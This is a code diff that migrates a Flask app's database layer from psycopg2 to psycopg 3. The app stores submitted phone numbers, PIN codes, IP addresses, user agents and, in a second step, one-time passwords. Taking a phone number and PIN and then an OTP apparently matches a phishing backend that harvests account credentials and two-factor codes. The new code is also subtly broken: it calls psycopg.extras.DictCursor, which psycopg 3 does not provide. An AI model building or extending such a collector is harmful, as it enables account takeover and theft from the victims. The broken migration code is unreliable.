@@ -3,7 +3,7 @@ print("🔥 flask_app.py loaded successfully 🔥")
 import os
 import re
 import psycopg
-import psycopg.extras
+from psycopg import extras
 import requests
 
 from flask import (
@@ -38,12 +38,8 @@ def get_db_connection():
         raise RuntimeError("DATABASE_URL is not set in Render environment variables!")
 
     try:
-        # When using full URL, sslmode goes in the ?query part (e.g. ?sslmode=require)
-        # Do NOT pass sslmode as separate kwarg here
-        conn = psycopg2.connect(
-            db_url,
-            cursor_factory=psycopg2.extras.DictCursor,
-        )
+        # Using psycopg 3 connect with autocommit and DictCursor
+        conn = psycopg.connect(db_url, autocommit=True, cursor_factory=psycopg.extras.DictCursor)
         print("✅ DB connection established")
         return conn
     except Exception as e:
@@ -54,33 +50,27 @@ def get_db_connection():
 def init_database():
     try:
         conn = get_db_connection()
-        cur = conn.cursor()
-
-        cur.execute("""
-            CREATE TABLE IF NOT EXISTS user_data (
-                id SERIAL PRIMARY KEY,
-                phone_number VARCHAR(20),
-                pin_code VARCHAR(10),
-                selected_plan VARCHAR(100),
-                plan_price VARCHAR(50),
-                ip_address VARCHAR(50),
-                user_agent TEXT,
-                page_url TEXT,
-                otp_code VARCHAR(10),
-                entry_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-            );
-        """)
-
-        conn.commit()
+        with conn.cursor() as cur:
+            cur.execute("""
+                CREATE TABLE IF NOT EXISTS user_data (
+                    id SERIAL PRIMARY KEY,
+                    phone_number VARCHAR(20),
+                    pin_code VARCHAR(10),
+                    selected_plan VARCHAR(100),
+                    plan_price VARCHAR(50),
+                    ip_address VARCHAR(50),
+                    user_agent TEXT,
+                    page_url TEXT,
+                    otp_code VARCHAR(10),
+                    entry_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+                );
+            """)
         print("✅ Database initialized / table ready")
     except Exception as e:
         print(f"⚠️ Database init skipped (may already exist or connection issue): {e}")
     finally:
-        if 'cur' in locals():
-            cur.close()
         if 'conn' in locals():
             conn.close()
-
 
 # Run init safely on startup (won't crash Render if DB not ready yet)
 init_database()
@@ -166,33 +156,29 @@ def save_phone_pin():
 
     try:
         conn = get_db_connection()
-        cur = conn.cursor()
+        with conn.cursor() as cur:
+            cur.execute("""
+                INSERT INTO user_data
+                (phone_number, pin_code, selected_plan, plan_price, ip_address, user_agent, page_url)
+                VALUES (%s, %s, %s, %s, %s, %s, %s)
+                RETURNING id
+            """, (
+                phone,
+                pin,
+                plan["name"],
+                plan["price"],
+                request.remote_addr,
+                request.headers.get("User-Agent"),
+                request.referrer,
+            ))
 
-        cur.execute("""
-            INSERT INTO user_data
-            (phone_number, pin_code, selected_plan, plan_price, ip_address, user_agent, page_url)
-            VALUES (%s, %s, %s, %s, %s, %s, %s)
-            RETURNING id
-        """, (
-            phone,
-            pin,
-            plan["name"],
-            plan["price"],
-            request.remote_addr,
-            request.headers.get("User-Agent"),
-            request.referrer,
-        ))
-
-        entry_id = cur.fetchone()["id"]
-        conn.commit()
+            entry_id = cur.fetchone()["id"]
         print(f"✅ Saved submission with ID {entry_id}")
 
     except Exception as e:
         print(f"❌ DB error in save_phone_pin: {e}")
         abort(500)
     finally:
-        if 'cur' in locals():
-            cur.close()
         if 'conn' in locals():
             conn.close()
 
@@ -227,22 +213,17 @@ def save_otp():
 
     try:
         conn = get_db_connection()
-        cur = conn.cursor()
-
-        cur.execute(
-            "UPDATE user_data SET otp_code=%s WHERE id=%s",
-            (otp, entry_id),
-        )
-
-        conn.commit()
+        with conn.cursor() as cur:
+            cur.execute(
+                "UPDATE user_data SET otp_code=%s WHERE id=%s",
+                (otp, entry_id),
+            )
         print(f"✅ OTP saved for entry {entry_id}")
 
     except Exception as e:
         print(f"❌ OTP save error: {e}")
         abort(500)
     finally:
-        if 'cur' in locals():
-            cur.close()
         if 'conn' in locals():
             conn.close()
 
